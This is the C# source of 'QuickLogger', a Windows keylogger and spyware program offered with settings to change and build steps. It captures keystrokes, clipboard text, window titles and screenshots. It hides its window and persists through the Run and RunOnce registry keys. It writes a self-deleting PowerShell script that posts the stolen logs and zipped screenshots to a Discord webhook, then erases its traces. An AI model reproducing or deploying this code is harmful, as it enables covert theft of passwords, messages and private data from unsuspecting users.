using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Timers;
using System.Text;
using System.IO.Compression;
using System.Diagnostics;
using System.Threading;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Specialized;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.Intrinsics.Arm;


namespace QuickLogger
{
    public partial class Form1 : Form
    {
        // ------------------------------------------- //
        // TODO List
        // ------------------------------------------- //
        // * DONE Functional webhook
        // * DONE Save to log file
        // * DONE Log keypresses
        // * DONE Log clipboard
        // * DONE Log window title
        // * DONE Log active window
        // * DONE Log screenshots
        // * DONE Persistence (run-once)
        // * Persistence (registry)
        // * DONE Send log to webhook
        // * DONE Send screenshots to webhook
        // * Make process and window title getting working for one-filed exe
        // * Kill other already open quick loggers when opening a new one.
        // ------------------------------------------- //

        // --------------------------------- //
        // SETTINGS FOR YOU TO CHANGE BELOW.
        // Then build by clicking "Build" -> "Build Solution"
        // Then run the .exe file in the bin folder.
        // --------------------------------- //
        private bool DebugMode = true; // If false, the window will be hidden and the program will run in the background.
        public string Webhook = "<WEBHOOK URL>"; // Webhook URL
        public String path = "C:\\users\\public\\Log.txt"; // Path to save log file
        public bool Persistence = false; // If true, the program will add itself to the registry and start on boot.
        public string RegistryKeyName = "QuickLogger"; // Name of the registry key
        public String persistencePath = "C:\\users\\public\\persistence"; // Path to save persistence file
        public bool useScreenshot = true; // OBS! ONLY POSSIBLE IF PERSISTENCE IS TRUE! If true, the program will take screenshots and send them zipped when sending log.
        public int ScreenshotInterval = 10000; // Interval between screenshots
        public String ScreenshotPath = "C:\\users\\public\\Screenshots"; // Path to save screenshots
        public String FlagPath = "C:\\users\\public\\flag.txt"; // Path to save timestamp file


        // -------- OTHER VARIABLES -------- //
        public string version = "1.0.0";
        public DateTime firstInfectionTimestamp = DateTime.Now;

        // Computer details
        string username = "";
        string hostname = "";
        string cpu = "";
        string ram = "";
        string gpu = "";
        string externalIP = "";
        string internalIP = "";
        string os = "";

        // Keyloggers
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);


        // Process (Active window)
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll")]
        public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);


        // Screenshots
        public const int DESKTOPVERTRES = 0x75;
        public const int DESKTOPHORZRES = 0x76;
        [DllImport("gdi32.dll")]
        public static extern int GetDeviceCaps(IntPtr hDC, int index);



        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            ////////////////////
            // Set debug mode //
            ////////////////////

            if (!DebugMode)
            {
                Visible = false; // Hide form window.
                ShowInTaskbar = false; // Remove from taskbar.
                Opacity = 0;
                Log("Debug", "Debug mode disabled. (Hidden Window)");
            }
            else
            {
                Log("Debug", "Debug mode enabled.");
            }

            ////////////////////
            // Kill processes //
            ////////////////////

            // Get the current process.
            Process currentProcess = Process.GetCurrentProcess();

            // Get all processes running on the local computer.
            Process[] localAll = Process.GetProcesses();

            // Loop through the processes.
            foreach (Process process in localAll)
            {
                // Check if the process is the same as the current process.
                if (process.Id != currentProcess.Id)
                {
                    // Check if the process is the same as the current process.
                    if (process.ProcessName == currentProcess.ProcessName)
                    {
                        // Kill the process.
                        process.Kill();
                    }
                }
            }

            //////////////////////////
            // Get computer details //
            //////////////////////////

            // Get username
            try
            {
                // Get the username
                username = Environment.UserName;
            }
            catch
            {
                // Get the username
                username = "Unknown";
            }
            Log("Info", "Username: " + username);
            // Get hostname
            try
            {
                // Get the hostname
                hostname = Dns.GetHostName();
            }
            catch
            {
                // Get the hostname
                hostname = "Unknown";
            }
            Log("Info", "Hostname: " + hostname);
            // Get CPU
            try
            {
                // Get the CPU
                cpu = Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER");
            }
            catch
            {
                // Get the CPU
                cpu = "Unknown";
            }
            Log("Info", "CPU: " + cpu);
            // Get RAM
            try
            {
                ram = Environment.GetEnvironmentVariable("RAM_IDENTIFIER");
            }
            catch
            {
                ram = "Unknown";
            }
            Log("Info", "RAM: " + ram);
            // Get GPU
            try
            {
                // Get the GPU
                gpu = Environment.GetEnvironmentVariable("GPU_IDENTIFIER");
            }
            catch
            {
                // Get the GPU
                gpu = "Unknown";
            }
            Log("Info", "GPU: " + gpu);
            // Get External IP
            try
            {
                externalIP = new WebClient().DownloadString("http://icanhazip.com");
                // Remove any new lines
                externalIP = externalIP.Replace("\r", "").Replace("\n", "");
            }
            catch
            {
                externalIP = "Unknown";
            }
            Log("Info", "External IP: " + externalIP);
            // Get Internal IP
            try
            {
                internalIP = Dns.GetHostAddresses(Dns.GetHostName())[0].ToString();
                // Remove any new lines
                internalIP = internalIP.Replace("\r", "").Replace("\n", "");

            }
            catch
            {
                internalIP = "Unknown";
            }
            Log("Info", "Internal IP: " + internalIP);
            // Get OS
            try
            {
                os = Environment.OSVersion.ToString();

            }
            catch
            {
                os = "Unknown";
            }
            Log("Info", "OS: " + os);


            /////////////////
            // Persistence //
            /////////////////
            
            if (Persistence)
            {
                string currentProcessPath = "";
                try
                {
                    // Get the current process.
                    Process theCurrentProcess = Process.GetCurrentProcess();

                    // Get the path to the current process.
                    currentProcessPath = theCurrentProcess.MainModule.FileName;

                    // Log
                    Log("Persistence", "Current process path: " + currentProcessPath);
                }
                catch (Exception ex)
                {
                    Log("Persistence", "Failed to get current process path: " + ex.Message);
                }

                try
                {
                    // Log
                    Log("Persistence", "Moving file to persistence directory...");

                    // Check if the exe file already exists in the persistence directory
                    if (File.Exists(persistencePath + "\\" + RegistryKeyName + ".exe"))
                    {
                        // Log
                        Log("Persistence", "File already exists in persistence directory...");
                        // Delete the file
                        File.Delete(persistencePath + "\\" + RegistryKeyName + ".exe");
                        // Log
                        Log("Persistence", "Deleted file from persistence directory...");
                    }
                    
                    // Move the currentProcessPath to the persistence directory
                    File.Move(currentProcessPath, persistencePath + "\\" + RegistryKeyName + ".exe");

                    // Log
                    Log("Persistence", "Moved file to persistence directory!");
                }
                catch (Exception ex)
                {
                    Log("Persistence", "Failed to move file to persistence directory: " + ex.Message);
                }

                // Add to registry
                try
                {
                    Log("Registry", "Adding to registry...");

                    // Create a path to the exe file in the persistence directory
                    string exePath = persistencePath + "\\" + RegistryKeyName + ".exe";

                    // Add to registry
                    RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    key.SetValue(RegistryKeyName, exePath);
                    Log("Registry", "Added to registry.");
                }
                catch (Exception ex)
                {
                    Log("Registry", "Failed to add to registry: " + ex.Message);
                }

                // Check if there is a found flag file
                if (File.Exists(FlagPath))
                {
                    // Send the log to the webhook
                    Task.Run(() => sendWebhook());
                }
                else
                {
                    CreateFlag();
                }
            }
            else
            {
                // Log that flag file is not used
                Log("Flag", "Flag file not used because of no persistence...");

                string psPath = "C:\\users\\public\\hidden.ps1";
                string psContent = $"$webhookURL = \"{Webhook}\"\r\n";
                string discordMessage = $"**Hello, new letter for you from last boot! (Version: {version})**`n{username}, or in computer terms called {hostname} from {externalIP} has some information for you:`n**Username:** {username}`n**Hostname:** {hostname}`n**First infection:** {firstInfectionTimestamp}`n**CPU:** {cpu}`n**RAM:** {ram}`n**GPU:** {gpu}`n**External IP:** {externalIP}`n**Internal IP:** {internalIP}`n**OS:** {os}`n`nThere is also a log file below...`n**Sincerely {username}!**";
                Log("Logger", "Creating hidden.ps1 file");
                try
                {
                    // Make a .ps1 file that will send the log and delete itself
                    psContent += $"$filePath = \"{path}\"\r\n";
                    psContent += $"$fileContent = Get-Content -Path $filePath -Raw\r\n";
                    // Construct the JSON payload
                    psContent += $"$payload = @{{\r\n    content = \"{discordMessage}\"\r\n}}\r\n";
                    psContent += $"$jsonPayload = $payload | ConvertTo-Json\r\n";
                    // Construct the multipart form-data request
                    psContent += $"$boundary = [System.Guid]::NewGuid().ToString()\r\n";
                    psContent += $"$LF = \"`r`n\"\r\n";
                    psContent += $"$multipartContent = \"--$boundary$LF\"\r\n";
                    psContent += $"$multipartContent += \"Content-Disposition: form-data; name=`\"payload_json`\"$LF\"\r\n";
                    psContent += $"$multipartContent += \"Content-Type: application/json$LF$LF\"\r\n";
                    psContent += $"$multipartContent += \"$jsonPayload$LF\"\r\n";
                    psContent += $"$multipartContent += \"--$boundary$LF\"\r\n";
                    psContent += $"$multipartContent += \"Content-Disposition: form-data; name=`\"file`\"; filename=`\"Log.txt`\"$LF\"\r\n";
                    psContent += $"$multipartContent += \"Content-Type: text/plain$LF$LF\"\r\n";
                    psContent += $"$multipartContent += $fileContent\r\n";
                    psContent += $"$multipartContent += \"$LF--$boundary--$LF\"\r\n";
                    psContent += $"$headers = @{{\r\n";
                    psContent += $"    \"Content-Type\" = \"multipart/form-data; boundary=`\"$boundary`\"\"\r\n";
                    psContent += $"}}\r\n";
                    // Send the request
                    psContent += $"Invoke-RestMethod -Uri $webhookURL -Method Post -Body $multipartContent -Headers $headers\r\n";
                    // Wait a few seconds
                    psContent += $"Start-Sleep -Seconds 5\r\n";
                    // Check if the {ScreenshotPath} exists if so, delete it
                    psContent += $"if (Test-Path {ScreenshotPath}) {{\r\n";
                    psContent += $"    Remove-Item -Path {ScreenshotPath} -Recurse -Force\r\n";
                    psContent += $"}}\r\n";
                    // Remove the log file
                    psContent += $"Remove-Item -Path $filePath\r\n";
                    // Remove the .ps1 file
                    psContent += $"Remove-Item -Path $MyInvocation.MyCommand.Path\r\n";
                    File.WriteAllText(psPath, psContent);
                    // log
                    Log("Logger", "Created hidden.ps1");
                }
                catch (Exception ex)
                {
                    Log("Logger", "Failed to create hidden.ps1: " + ex.Message);
                }
                

                Log("Logger", "Adding to run-once registry...");
                // Make a run-once registry key
                try
                {
                    // Add to registry
                    RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
                    key.SetValue(RegistryKeyName, $"powershell.exe -ExecutionPolicy ByPass -File \"{psPath}\"");
                    Log("Logger", "Added to registry.");
                }
                catch (Exception ex)
                {
                    Log("Logger", "Failed to add to registry: " + ex.Message);
                }
            }

            //////////////////////
            // Start the logger //
            //////////////////////

            // Start the logger as separate thread.
            Task.Run(() => Logger());
        }

        public void Log(string about, string message)
        {
            txtOutput.AppendText(about + "          " + message + "\r\n");
        }


        // Add to log file
        public void AddToLog(int type, string content)
        {
            // Find current date and time
            string date = DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss");
            // Add the content to the log file
            string contentToAdd = $"{date} : ";
            if (type == 0) // Debug
            {
                // Log
                Log("Log", $"Attempting to add a debug to log...");
                contentToAdd += $"DEBUG: {content}";
            }
            else if (type == 1) // Keylogger key
            {
                // Log
                Log("Log", $"Attempting to add a key to log...");
                contentToAdd += $"KEY: {content}";
            }
            else if (type == 2) // Clipboard
            {
                // Log
                Log("Log", $"Attempting to add a clipboard to log...");
                contentToAdd += $"CLIPBOARD: {content}";
            }
            else if (type == 3) // Clipboard (Multi-Lined)
            {
                // Log
                Log("Log", $"Attempting to add a multi-lined clipboard to log...");
                contentToAdd += $"CLIPBOARD (Multi-lined): \r\n\"\r\n{content}\r\n\"";
            }
            else if (type == 4) // Window title
            {
                // Log
                Log("Log", $"Attempting to add a process to log...");
                // Split content by ;:; to get the title and the process
                string[] split = content.Split(new string[] { ";:;" }, StringSplitOptions.None);
                contentToAdd += $"\r\n------------------------------------\r\nPROCESS: {split[0]} ({split[1]})";
            }
            else // Other
            {
                // Log
                Log("Log", $"Attempting to add something else to log...");
                contentToAdd += content;
            }
            // Add the content to temp log
            txtKeys.AppendText(contentToAdd + "\r\n");
            // Add the content to the log file
            File.AppendAllText(path, contentToAdd + "\r\n");
        }


        public void Logger()
        {
            Log("Logger", "Logger starting...");
            // Log path
            Log("Logger", "Log path: " + path);
            if (useScreenshot)
            {
                Log("Logger", "Screenshot enabled...");
                // Create screenshot folder
                if (!Directory.Exists(ScreenshotPath))
                {
                    Directory.CreateDirectory(ScreenshotPath);
                }
                Task.Run(() => Screenshot());
            }
            Task.Run(() => clipper());
            Task.Run(() => ActiveWindow());
            Task.Run(() => Keylogger());
        }


        // ----------- KEYLOGGER ----------- //
        public void Keylogger()
        {
            Log("Keylogger", "Keylogger starting...");
            int lastCode = 0;
            string Sequence = "";
            double lastTime = 0;

            while (true)
            {
                Thread.Sleep(100);

                for (int i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    // 32769 should be used for windows 10.
                    if (keyState == 1 || keyState == -32767 || keyState == 32769)
                    {
                        // Verify key
                        String keyString = verifyKey(i, lastCode);

                        lastCode = i;
                        double timeDiff = DateTime.Now.TimeOfDay.TotalSeconds - lastTime;
                        // Log
                        Log("Keylogger", $"Time diffrence: {timeDiff}");
                        // Check when last key was pressed
                        if (timeDiff < 4)
                        {
                            Sequence += keyString;
                        }
                        else
                        {
                            // Add to log file
                            AddToLog(1, Sequence);
                            // Clear sequence
                            Sequence = keyString;
                        }
                        lastTime = DateTime.Now.TimeOfDay.TotalSeconds;
                        break;
                    }
                }
            }
        }
        private String verifyKey(int code, int last)
        {
            if (last == 16)
            {
                last = 160;
            }

            if (code == 16)
                code = 160;

            String key = "";

            if (code == 1) key = "[Mouse1]";
            else if (code == 2) key = "[Mouse2]";
            else if (code == 8) key = "[Back]";
            else if (code == 9) key = "[TAB]";
            else if (code == 13) key = "[Enter]";
            else if (code == 19) key = "[Pause]";
            else if (code == 20) key = "[Caps Lock]";
            else if (code == 27) key = "[Esc]";
            else if (code == 32) key = "[Space]";
            else if (code == 33) key = "[Page Up]";
            else if (code == 34) key = "[Page Down]";
            else if (code == 35) key = "[End]";
            else if (code == 36) key = "[Home]";
            else if (code == 37) key = "Left]";
            else if (code == 38) key = "[Up]";
            else if (code == 39) key = "[Right]";
            else if (code == 40) key = "[Down]";
            else if (code == 44) key = "[Print Screen]";
            else if (code == 45) key = "[Insert]";
            else if (code == 46) key = "[Delete]";
            else if (code == 48) key = "0";
            else if (code == 49) key = "1";
            else if (code == 50) key = "2";
            else if (code == 51) key = "3";
            else if (code == 52) key = "4";
            else if (code == 53) key = "5";
            else if (code == 54) key = "6";
            else if (code == 55) key = "7";
            else if (code == 56) key = "8";
            else if (code == 57) key = "9";
            else if (code == 65) key = "a";
            else if (code == 66) key = "b";
            else if (code == 67) key = "c";
            else if (code == 68) key = "d";
            else if (code == 69) key = "e";
            else if (code == 70) key = "f";
            else if (code == 71) key = "g";
            else if (code == 72) key = "h";
            else if (code == 73) key = "i";
            else if (code == 74) key = "j";
            else if (code == 75) key = "k";
            else if (code == 76) key = "l";
            else if (code == 77) key = "m";
            else if (code == 78) key = "n";
            else if (code == 79) key = "o";
            else if (code == 80) key = "p";
            else if (code == 81) key = "q";
            else if (code == 82) key = "r";
            else if (code == 83) key = "s";
            else if (code == 84) key = "t";
            else if (code == 85) key = "u";
            else if (code == 86) key = "v";
            else if (code == 87) key = "w";
            else if (code == 88) key = "x";
            else if (code == 89) key = "y";
            else if (code == 90) key = "z";
            else if (code == 91) key = "[Windows]";
            else if (code == 92) key = "[Windows]";
            else if (code == 93) key = "[List]";
            else if (code == 96) key = "0";
            else if (code == 96 && last == 160 || last == 161) key = "=";
            else if (code == 97) key = "1";
            else if (code == 97 && last == 160 || last == 161) key = "!";
            else if (code == 98) key = "2";
            else if (code == 98 && last == 160 || last == 161) key = "\"";
            else if (code == 99) key = "3";
            else if (code == 99 && last == 160 || last == 161) key = "#";
            else if (code == 100) key = "4";
            else if (code == 100 && last == 160 || last == 161) key = "¤";
            else if (code == 101) key = "5";
            else if (code == 101 && last == 160 || last == 161) key = "%";
            else if (code == 102) key = "6";
            else if (code == 102 && last == 160 || last == 161) key = "&";
            else if (code == 103) key = "7";
            else if (code == 103 && last == 160 || last == 161) key = "/";
            else if (code == 104) key = "8";
            else if (code == 104 && last == 160 || last == 161) key = "(";
            else if (code == 105) key = "9";
            else if (code == 105 && last == 160 || last == 161) key = ")";
            else if (code == 106) key = "*";
            else if (code == 107) key = "+";
            else if (code == 109) key = "-";
            else if (code == 110) key = ",";
            else if (code == 111) key = "/";
            else if (code == 112) key = "[F1]";
            else if (code == 113) key = "[F2]";
            else if (code == 114) key = "[F3]";
            else if (code == 115) key = "[F4]";
            else if (code == 116) key = "[F5]";
            else if (code == 117) key = "[F6]";
            else if (code == 118) key = "[F7]";
            else if (code == 119) key = "[F8]";
            else if (code == 120) key = "[F9]";
            else if (code == 121) key = "[F10]";
            else if (code == 122) key = "[F11]";
            else if (code == 123) key = "[F12]";
            else if (code == 144) key = "[Num Lock]";
            else if (code == 145) key = "[Scroll Lock]";
            else if (code == 160) key = "[Shift]";
            else if (code == 161) key = "[Shift]";
            else if (code == 162) key = "[Ctrl]";
            else if (code == 163) key = "[Ctrl]";
            else if (code == 164) key = "[Alt]";
            else if (code == 165) key = "[Alt]";
            else if (code == 187) key = "+";
            else if (code == 186) key = "ç";
            else if (code == 188) key = ",";
            else if (code == 189) key = "-";
            else if (code == 190) key = ".";
            else if (code == 192) key = "'";
            else if (code == 191) key = ";";
            else if (code == 193) key = "/";
            else if (code == 194) key = ".";
            else if (code == 219) key = "´";
            else if (code == 220) key = "]";
            else if (code == 221) key = "[";
            else if (code == 222) key = "~";
            else if (code == 226) key = "\\";
            else key = "[" + code + "]";

            // Check if last key is shift and key is a letter
            if (last == 160 || last == 161 && code <= 90 && code >= 65)
            {
                key = key.ToUpper();
            }

            return key;
        }



        // ---- ACTIVE WINDOW (PROCESS) ---- //
        public void ActiveWindow()
        {
            Log("Process", "Process and window starting...");
            string last = "";
            while (true)
            {
                int checkNum = 0;
                string title = GetFocusedWindowTitle();
                string process = GetFocusedProcess();
                if (title != last)
                {
                    Log("Process", $"Process: {process} ({title})");
                    last = title;
                    // Combine title and process
                    string finnishedProduct = process + ";:;" + title;
                    // Add to log file
                    AddToLog(4, finnishedProduct);
                }
                // Do something
                checkNum++;
                Thread.Sleep(1000);
            }
        }
        public string GetFocusedProcess()
        {
            IntPtr hwnd = GetForegroundWindow();
            uint pid;
            GetWindowThreadProcessId(hwnd, out pid);
            Process p = Process.GetProcessById((int)pid);
            return p.ProcessName;
        }
        public string GetFocusedWindowTitle()
        {
            const int nChars = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder Buff = new StringBuilder(nChars);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }


        // ----------- SCREENSHOT ---------- //
        public void Screenshot()
        {
            Log("Screenshot", "Screenshot starting...");
            while (true)
            {
                // Get the time
                string date = DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss");
                    
                // Check if the folder exists
                if (!Directory.Exists(ScreenshotPath))
                {
                    Directory.CreateDirectory(ScreenshotPath);
                }

                // Take screenshot
                string path = ScreenshotPath + "\\" + date + ".png";
                Log("Screenshot", "Taking screenshot...");

                // Take screenshot
                try
                {
                    // Get the bounds of the virtual screen (all monitors combined)
                    Rectangle totalBounds = SystemInformation.VirtualScreen;

                    // Make variables for how many screens there are
                    int screenCount = Screen.AllScreens.Length;
                    // Log
                    Log("Screenshot", $"Number of screens: {screenCount}");

                    // If there is only one screen
                    if (screenCount == 1)
                    {
                        // Take a screenshot of entire screen
                        try
                        {
                            int width, height;
                            using (var g = Graphics.FromHwnd(IntPtr.Zero))
                            {
                                var hDC = g.GetHdc();
                                width = GetDeviceCaps(hDC, DESKTOPHORZRES);
                                height = GetDeviceCaps(hDC, DESKTOPVERTRES);
                                g.ReleaseHdc(hDC);
                            }

                            // Take screenshot and save
                            using (var img = new Bitmap(width, height))
                            {
                                using (var g = Graphics.FromImage(img))
                                {
                                    g.CopyFromScreen(0, 0, 0, 0, img.Size);
                                }
                                img.Save(path, System.Drawing.Imaging.ImageFormat.Jpeg);
                            }

                            // Find path to the file
                            string filePath = Path.GetFullPath(path);

                            // Log save file
                            Log("Screenshot", $"Screenshot saved to: {filePath}");
                        }
                        catch (Exception ex)
                        {
                            Log("Screenshot", $"Error when taking screenshot {(ex.Message)}");
                        }
                    }
                    else
                    {
                        // Take a screenshot covering all screens with specified pixel format
                        using (var screenshot = new Bitmap(totalBounds.Width, totalBounds.Height, PixelFormat.Format32bppArgb))
                        using (var gfxScreenshot = Graphics.FromImage(screenshot))
                        {
                            // Capture the virtual screen
                            gfxScreenshot.CopyFromScreen(totalBounds.X, totalBounds.Y, 0, 0, totalBounds.Size, CopyPixelOperation.SourceCopy);

                            // Save the screenshot to a dynamically generated filename
                            string screenshotPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
                            screenshot.Save(screenshotPath);

                            // Log save file
                            Log("Screenshot", $"Screenshot saved to: {screenshotPath}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Log
                    Log("Screenshot", $"Error taking screenshot: {ex.Message}");
                }

                // Wait
                Thread.Sleep(ScreenshotInterval);
            }
            
        }


        // ------------ CLIPPER ------------ //
        public void clipper()
        {
            Log("Clipper", "Clipper starting...");
            string last = "";
            while (true)
            {
                // Get clipboard
                string clip = GetClipText();
                if (clip != last)
                {
                    // Check if clipboard is multi-line
                    if (clip.Contains("\n"))
                    {
                        Log("Clipper", $"Clipboard (Multi-line): \r\n\"\r\n{clip}\r\n\"");
                        // Add to log file
                        AddToLog(3, clip);
                    }
                    else
                    {
                        Log("Clipper", "Clipboard: " + clip);
                        // Add to log file
                        AddToLog(2, clip);
                    }
                    last = clip;
                }
                Thread.Sleep(1000);
            }
        }

        public string GetClipText()
        {
            string ReturnValue = "";
            Thread STAThread = new Thread(
                               delegate ()
                               {
                                   ReturnValue = Clipboard.GetText();
                               });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
            return ReturnValue;
        }



        // ------------ WEBHOOK ----------- //
        public void sendWebhook()
        {
            // Check if it found the flag file
            if (File.Exists(FlagPath))
            {
                Log("Flag", "Found timestamp...");
                // Read the content of the file
                string content = File.ReadAllText(FlagPath);
                // Log
                Log("Flag", "First infection happend here: " + content);
                // Make timestamp into variable
                firstInfectionTimestamp = DateTime.Parse(content);
            }
            else
            {
                CreateFlag();
            }

            // Get the message
            string messageContent = $"**Hello, new letter for you from last boot! (Version: {version})**\r\n{username}, or in computer terms called {hostname} from {externalIP} has some information for you:\r\n**Username:** {username}\r\n**Hostname:** {hostname}\r\n**First infection:** {firstInfectionTimestamp}\r\n**CPU:** {cpu}\r\n**RAM:** {ram}\r\n**GPU:** {gpu}\r\n**External IP:** {externalIP}\r\n**Internal IP:** {internalIP}\r\n**OS:** {os}\r\n\r\nThere is also a log file below...\r\n**Sincerely {username}!**";

            // Send the log to the webhook
            Task<bool> success = SendDiscordAttachment(Webhook, messageContent, path);
            // Check if the message was sent
            if (success.Result)
            {
                Log("Webhook", "Log sent to webhook.");
            }
            else
            {
                Log("Webhook", "Failed to send log to webhook.");
            }

            if (useScreenshot)
            {
                messageContent = "Zipped screenshots below as requested...";

                // Zip the log folder
                ZipFolder(ScreenshotPath, "C:\\users\\public\\sss.zip");

                // Send the zipped folder
                Task<bool> zippedSuccess = SendDiscordAttachment(Webhook, messageContent, "C:\\users\\public\\sss.zip");
                // Check if the message was sent
                if (zippedSuccess.Result)
                {
                    Log("Webhook", "Sent zipped screenshots to webhook.");
                }
                else
                {
                    Log("Webhook", "Failed to send zipped screenshots to webhook.");
                }

                // Remove the zipped folder
                File.Delete("C:\\users\\public\\sss.zip");
                // Remove the log folder
                Directory.Delete(ScreenshotPath, true);
            }

        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            Task.Run(() => sendWebhook());
        }

        // Create flag file
        private void CreateFlag()
        {
            // Create the flag file
            File.WriteAllText(FlagPath, DateTime.Now.ToString());
            // Log
            Log("Flag", "Created timestamp for first infection...");
        }

        // Zip a folder
        public void ZipFolder(string startPath, string zipPath)
        {
            // Check if the file exists
            if (File.Exists(zipPath))
            {
                // Delete the file
                File.Delete(zipPath);
            }
            // Zip the folder
            ZipFile.CreateFromDirectory(startPath, zipPath);
        }


        // Send message and local disk attachment to webhook
        private async Task<bool> SendDiscordAttachment(string webhookUrl, string messageContent, string attachmentPath)
        {
            using (var client = new HttpClient())
            {
                using (var formData = new MultipartFormDataContent())
                {
                    // Add message content
                    formData.Add(new StringContent(messageContent), "content");

                    // Add attachment
                    if (File.Exists(attachmentPath))
                    {
                        var attachment = new FileStream(attachmentPath, FileMode.Open);
                        formData.Add(new StreamContent(attachment), "file", Path.GetFileName(attachmentPath));
                    }

                    var response = await client.PostAsync(webhookUrl, formData);

                    return response.IsSuccessStatusCode;
                }
            }
        }
    }
}